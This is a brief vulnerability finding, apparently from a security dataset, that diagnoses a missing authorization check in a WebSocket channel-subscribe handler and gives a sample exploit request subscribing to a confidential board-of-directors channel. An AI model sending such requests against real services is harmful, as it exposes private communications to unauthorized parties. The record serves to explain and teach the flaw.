diagnosis: In an API Gateway WebSocket API, the $default message handler accepts channelId from the client payload and subscribes connectionId to targetChannelId without verifying that the connection's authorizer context (event.requestContext.authorizer) has permission to access that channel. An attacker can connect and subscribe to private corporate executive chat channels.
exploit_request:
POST / HTTP/1.1
Host: ws-api.enterprise.com
Upgrade: websocket
Connection: Upgrade

{"action": "subscribe", "channelId": "chn_board_of_directors_confidential"}
